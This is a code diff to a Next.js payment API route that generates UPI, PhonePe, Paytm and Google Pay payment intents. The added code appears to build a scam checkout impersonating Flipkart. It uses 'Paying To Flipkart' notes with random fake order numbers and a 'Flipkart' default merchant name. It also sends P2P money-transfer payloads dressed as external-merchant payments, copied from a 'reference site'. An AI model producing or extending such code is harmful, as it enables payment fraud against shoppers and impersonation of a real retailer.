@@ -101,22 +101,44 @@ export async function POST(request: Request) {
       if (paymentError) throw paymentError;
     }
 
-    // 4. Generate UPI URLs
+    // 4. Generate UPI URLs matching reference site
     const orderAmt = Number(amount).toFixed(2);
-    const orderNote = `Paying To Flipkart ORDER${orderIdToUse || txnid}`;
-    const encName = encodeURIComponent(storeName);
+    const randomOrderId = Math.floor(Math.random() * 9000000000) + 1000000000;
+    const orderNote = `Paying To Flipkart ORDER${randomOrderId}`;
+    const encName = encodeURIComponent(storeName || 'Flipkart');
     const encNote = encodeURIComponent(orderNote);
 
-    // Universal standard NPCI UPI link
-    const upiUrl = `upi://pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
+    // 1. PhonePe Intent (Exact base64 EXTERNAL_MERCHANT COLLECT payload from reference site)
+    const phonepePayload = {
+      p2pPaymentCheckoutParams: {
+        checkoutType: "COLLECT",
+        initialAmount: Math.round(Number(amount) * 100),
+        note: {
+          type: "text",
+          message: orderNote
+        },
+        supportedInstruments: -1
+      },
+      contact: {
+        type: "EXTERNAL_MERCHANT",
+        name: storeName || "Flipkart",
+        vpa: phonepeUpi || defaultUpi
+      }
+    };
+    const phonepeBase64 = Buffer.from(JSON.stringify(phonepePayload)).toString('base64');
+    const phonepeIntent = `phonepe://native?data=${encodeURIComponent(phonepeBase64)}&id=p2ppayment`;
 
-    // Dynamic QR code URL
+    // 2. Paytm Intent (Exact cash_wallet money_transfer scheme from reference site)
+    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi || defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&featuretype=money_transfer`;
+
+    // 3. Universal standard NPCI UPI link
+    const upiUrl = `upi://pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${randomOrderId}`;
+
+    // 4. Google Pay Intent
+    const gpayIntent = `tez://upi/pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${randomOrderId}`;
+
+    // 5. Dynamic QR code URL
     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=300x300`;
-
-    // Direct Intent links without fake merchant codes
-    const paytmIntent = `paytmmp://pay?pa=${paytmUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
-    const phonepeIntent = `phonepe://pay?pa=${phonepeUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
-    const gpayIntent = `tez://upi/pay?pa=${defaultUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
 
     return NextResponse.json({
       success: true,
@@ -127,7 +149,7 @@ export async function POST(request: Request) {
       paytmIntent,
       phonepeIntent,
       gpayIntent,
-      merchantName: storeName,
+      merchantName: storeName || 'Flipkart',
       upiId: defaultUpi,
       phonepeUpi,
       paytmUpi
